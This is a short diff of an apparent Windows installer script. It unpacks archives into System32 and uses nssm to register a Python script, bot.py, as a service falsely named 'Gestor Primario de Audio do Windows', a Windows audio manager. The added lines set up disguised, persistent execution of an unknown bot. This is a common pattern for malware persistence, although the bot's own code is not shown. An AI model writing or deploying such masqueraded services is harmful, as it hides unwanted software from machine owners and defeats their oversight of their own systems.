@@ -18,6 +18,7 @@ Expand-Archive -Path $destino3 -DestinationPath "C:\Windows\System32\ap32" -Forc
 Expand-Archive -Path $destino4 -DestinationPath "C:\Windows\System32\ap32" -Force
 Expand-Archive -Path $destino5 -DestinationPath "C:\Windows\System32\ap32\Res-PE" -Force
 
-"$destino" install "Gestor Primario de Audio do Windows" "C:\Windows\System32\re-as\WPy64\python\python.exe C:\Windows\System32\ap32\bot.py"
-"$destino" restart "Gestor Primario de Audio do Windows"
+C:\Windows\System32\ap32\nssm.exe install "Gestor Primario de Audio do Windows" "C:\Windows\System32\re-as\WPy64\python\python.exe C:\Windows\System32\ap32\bot.py"
+C:\Windows\System32\ap32\nssm.exe restart "Gestor Primario de Audio do Windows"
+
 exit
